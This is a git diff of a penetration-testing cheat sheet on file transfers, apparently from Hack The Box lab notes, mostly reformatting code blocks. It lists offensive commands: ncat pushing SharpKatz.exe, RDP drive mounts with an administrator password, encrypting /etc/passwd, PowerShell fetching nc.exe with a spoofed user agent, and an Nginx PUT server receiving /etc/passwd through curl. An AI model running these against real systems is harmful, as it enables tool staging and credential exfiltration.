@@ -49,16 +49,20 @@ https://en.wikipedia.org/wiki/List_of_file_signatures
 | ncat --send-only 192.168.49.128 8000 < SharpKatz.exe                                                                                                                                                                                                                                   | ncat - listening and send file on connect        |
 | `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`                                                                                                                                                                              | Mounting a Linux Folder Using rdesktop           |
 | `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`                                                                                                                                                               | Mounting a Linux Folder Using xfreerdp           |
-| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`                                                                                                                                                                                                             | Encrypting /etc/passwd with openssl              |
-| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`                                                                                                                                                                                                               | Decrypt passwd.enc with openssl<br>              |
-| `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() \| Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} \| fl`                                                                                                   | Listing out User Agents                          |
-| `PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`<br>`PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`                                                                                      | Request with Chrome User Agent<br>               |
+| ```<br>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc<br>```                                                                                                                                                                                                 | Encrypting /etc/passwd with openssl              |
+| ```<br>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd<br>```                                                                                                                                                                                                   | Decrypt passwd.enc with openssl<br>              |
+| ```<br>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() \| Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} \| fl<br>```                                                                                       | Listing out User Agents                          |
+| ```<br>PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome<br>PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"<br>```                                                                            | Request with Chrome User Agent<br>               |
 ## Nginx - Enabling PUT
 #### Create a Directory to Handle Uploaded Files
-crimsonguard@htb[/htb]`$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
+```
+crimsonguard@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+```
 
 #### Change the Owner to www-data
-crimsonguard@htb[/htb]`$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
+```
+crimsonguard@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+```
 
 #### Create Nginx Configuration File
 Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:
@@ -73,8 +77,8 @@ server {
 }
 ```
 #### Symlink our Site to the sites-enabled Directory
-```shell-session
-$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+```
+crimsonguard@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
 ```
 
 #### Start Nginx
@@ -95,8 +99,12 @@ crimsonguard@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
 ```
 
 #### Upload File Using cURL
-crimsonguard@htb[/htb]`$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`
+```
+crimsonguard@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+crimsonguard@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
+```
 
-crimsonguard@htb[/htb]`$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`
 
 user65:x:1000:1000:,,,:/home/user65:/bin/bash
+
+Other T
